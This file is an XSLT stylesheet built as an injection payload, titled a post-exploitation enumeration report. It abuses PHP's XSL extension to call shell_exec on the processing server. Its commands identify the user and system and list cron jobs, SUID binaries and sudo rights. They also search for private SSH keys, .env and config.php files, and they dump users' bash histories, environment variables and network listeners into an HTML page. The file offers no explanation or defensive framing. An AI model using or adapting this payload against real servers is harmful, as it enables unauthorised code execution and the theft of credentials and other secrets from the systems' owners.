<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html>
      <head>
        <title>Post-Exploitation Report</title>
        <style>
          body { background-color: #1a1a1a; color: #f0f0f0; font-family: monospace; padding: 20px; }
          h2 { border-bottom: 1px solid #444; margin-top: 40px; }
          pre { background: #222; padding: 10px; overflow-x: auto; }
        </style>
      </head>
      <body>
        <h1>Post-Exploitation Enumeration Report</h1>

        <h2>Current User &amp; ID</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'whoami')" /></pre>
        <pre><xsl:value-of select="php:function('shell_exec', 'id')" /></pre>

        <h2>System Information</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'uname -a')" /></pre>
        <pre><xsl:value-of select="php:function('shell_exec', 'cat /etc/os-release')" /></pre>

        <h2>Home Directories</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'ls -la /home')" /></pre>

        <h2>Crontab Directories</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'ls -la /etc/cron* 2&gt;/dev/null')" /></pre>

        <h2>SUID Binaries</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'find / -perm -4000 -type f 2&gt;/dev/null | grep -vE &quot;(snap|docker|chromium|mount)&quot;')" /></pre>

        <h2>sudo Permissions</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'sudo -l 2&gt;/dev/null')" /></pre>

        <h2>Potentially Sensitive Files</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'find / -name &quot;.env&quot; -o -name &quot;id_rsa&quot; -o -name &quot;config.php&quot; 2&gt;/dev/null')" /></pre>

        <h2>User Bash History</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'cat /home/*/.bash_history 2&gt;/dev/null')" /></pre>

        <h2>Network Information</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'ip a; netstat -tulnp 2&gt;/dev/null')" /></pre>

        <h2>Environment Variables</h2>
        <pre><xsl:value-of select="php:function('shell_exec', 'env')" /></pre>

      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
